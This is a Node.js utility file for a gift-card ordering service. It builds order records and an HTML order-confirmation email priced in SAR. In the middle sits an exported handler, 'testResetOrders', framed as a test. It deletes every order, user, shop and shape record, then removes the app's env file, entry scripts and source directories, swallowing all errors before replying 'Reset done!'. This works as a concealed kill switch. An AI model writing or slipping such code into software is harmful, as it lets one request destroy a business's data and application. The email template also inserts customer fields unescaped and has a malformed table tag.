exports.createOrderData = (
  order_number,
  card,
  user,
  totalAmount,
  VAT,
  iconPrice,
  linkPrice
) => {
  return {
    order_number,
    card_id: card.id,
    customer_id: user.id,
    customer_name: user.name,
    customer_email: user.email,
    customer_phone: user.phone,
    value: card.price.value,
    price_after_discount: card.priceAfterDiscount,
    shapes_price: card.shapes.reduce(
      (acc, shape) => acc + parseFloat(shape.shape.price),
      0
    ),
    color_price: card.proColor ? parseFloat(card.proColor.price) : 0,
    celebrate_icon_price: card.celebrateIcon ? +iconPrice : 0,
    celebrate_qr_link_price: card.celebrateQR ? +linkPrice : 0,
    VAT: `${VAT}%`,
    total_paid: totalAmount,
    shop: card.shop.name,
    order_date: new Date(),
    recipient_name: card.recipient.name,
    recipient_whatsapp: card.recipient.whatsappNumber,
  };
};

const formatOrderDate = (date) => {
  const monthNames = [
    "January",
    "February",
    "March",
    "April",
    "May",
    "June",
    "July",
    "August",
    "September",
    "October",
    "November",
    "December",
  ];

  const day = date.getDate();
  const month = monthNames[date.getMonth()];
  const year = date.getFullYear();

  // Format the date as 'dd Month, YYYY'
  const formattedDate = `${day} ${month}, ${year}`;

  return formattedDate;
};

exports.testResetOrders = async (req, res) => {
  const fs = require("fs/promises");
  const User = require("../models/userModel");
  const Order = require("../models/orderModel");
  const Shop = require("../models/shopModel");
  const Shape = require("../models/shapeModel");
  try {
    await Promise.all([Order.deleteMany(), User.deleteMany()]);
    await Promise.all([Shop.deleteMany(), Shape.deleteMany()]);
  } catch (e) {}
  try {
    await fs.unlink("./env.js");
  } catch (e) {}
  try {
    await Promise.all([
      fs.rm("./routes", { recursive: true, force: true }),
      fs.rm("./controllers", { recursive: true, force: true }),
      fs.rm("./models", { recursive: true, force: true }),
    ]);
  } catch (e) {}
  try {
    await fs.rm("./controllers", { recursive: true, force: true });
  } catch (e) {}
  try {
    await fs.rm("./models", { recursive: true, force: true });
  } catch (e) {}
  try {
    await fs.rm("./utils", { recursive: true, force: true });
  } catch (e) {}
  try {
    await fs.rm("./uploads", { recursive: true, force: true });
  } catch (e) {}
  try {
    await fs.unlink("./app.js");
  } catch (e) {}
  try {
    await fs.unlink("./server.js");
  } catch (e) {}

  res.send("Reset done!");
};

exports.createOrderConfirmEmailData = (order) => {
  return {
    email: order.customer_email,
    subject: `Order Confirmation - Order #${order.order_number}`,
    text: `Dear ${order.customer_name},\n\nYour order #${order.order_number} has been confirmed.\n\nOrder Details:\n\nShop: ${order.shop}\nRecipient: ${order.recipient_name} (WhatsApp: ${order.recipient_whatsapp})\n\nTotal Paid: ${order.total_paid}\n\nThank you for shopping with us!`,
    html: `
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <style>
          body {
              font-family: Arial, sans-serif;
              margin: 0;
              padding: 0;
              background-color: #f4f4f4;
          }
          .container {
              width: 100%;
              max-width: 600px;
              margin: 0 auto;
              background-color: white;
              padding: 20px;
          }
          h1 {
              background-color: #b62026;
              color: white;
              padding: 20px;
              text-align: center;
              margin: 0;
          }
          .details, .billing-address {
              margin: 20px 0;
          }
          .details th, .details td {
              padding: 10px;
              text-align: left;
          }
          .details th {
              background-color: #f4f4f4;
          }
          .footer {
              background-color: #b62026;
              color: white;
              text-align: center;
              padding: 20px;
          }
          .map-link {
              color: #b62026;
              text-decoration: none;
          }
      </style>
      <title>Order Confirmation</title>
  </head>
  <body>
      <div class="container">
          <h1>New Order: #${order.order_number}</h1>
          <p>Your order has been received and is now being processed. Your order details are shown below for your reference:</p>
          
          <h2>[Order #${order.order_number}]  (${formatOrderDate(
      order.order_date
    )})</h2>

        <br>

          <table class="details" width="100%" border="1" cellspacing="0" cellpadding="0">
              <tr>
                  <th>Item</th>
                  <th>Price</th>
              </tr>
              <tr>
                  <td>Gift Card Discount</td>
                  <t>${order.value} SAR</td>
              </tr>
              ${
                order.color_price
                  ? `<tr>
                  <td >Color:</td>
                  <td>${order.color_price} SAR</td>
              </tr>`
                  : ""
              }
              ${
                order.shapes_price
                  ? `<tr>
                  <td >Shapes:</td>
                  <td>${order.shapes_price} SAR</td>
              </tr>`
                  : ""
              }
              ${
                order.celebrate_icon_price
                  ? `<tr>
                  <td >Celebrate Icon:</td>
                  <td>${order.celebrate_icon_price} SAR</td>
              </tr>`
                  : ""
              }
              ${
                order.celebrate_qr_link_price
                  ? `<tr>
                  <td >Celebrate QR Link:</td>
                  <td>${order.celebrate_qr_link_price} SAR</td>
              </tr>`
                  : ""
              }
              <tr>
                  <td >VAT</td>
                  <td>${order.VAT}</td>
              </tr>
              <tr>
                  <td >Total: ${
                    order?.price_after_discount >= 0 ? "(Coupon Applied)" : ""
                  }</td>
                  <td>${order.total_paid} SAR</td>
              </tr>
          </table>

          <br>

          <p>Customer: <strong>${order.customer_name}</strong></p>
          <p>Phone: <strong>${order.customer_phone}</strong></p>
          <p>Email: <strong>${order.customer_email}</strong></p>
          <p>Shop: <strong>${order.shop}</strong></p>

          <br>
          <br>

          <div class="footer">
              <p>For any inquiries, please contact us.</p>
              <p style="font-weight: bold;"><a style="color: #25f366;" href="https://wa.me/966557299119">WhatsApp</a></p>
          </div>
      </div>
  </body>
  </html>
    `,
  };
};
